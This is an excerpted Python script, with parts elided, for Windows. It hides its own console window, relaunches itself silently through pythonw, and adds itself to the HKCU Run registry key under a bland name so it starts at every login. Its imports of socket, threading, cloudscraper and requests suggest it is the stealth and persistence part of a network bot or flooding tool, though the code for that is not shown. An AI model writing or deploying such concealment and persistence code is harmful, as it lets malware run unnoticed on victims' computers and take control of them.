import socket, threading, time, random, cloudscraper, requests, os, shutil, sys, subprocess, win32gui, win32con, winreg
...
def add_to_startup():
    ...
    try:
        ...
        enable_startup_entry(script_name)
    except Exception as e:
        print(f"Failed to add script to startup: {e}")

def enable_startup_entry(script_name):
    # Add a registry entry to enable the script on startup
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
            winreg.SetValueEx(reg_key, "ScriptName", 0, winreg.REG_SZ, os.path.abspath(script_name))
        print("Script enabled in startup.")
    except Exception as e:
        print(f"Failed to enable script in startup: {e}")

if __name__ == "__main__":
    # Hide the window
    hide_window()

    # Run the script in a hidden window
    subprocess.Popen(["pythonw", "script.py"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
    add_to_startup()
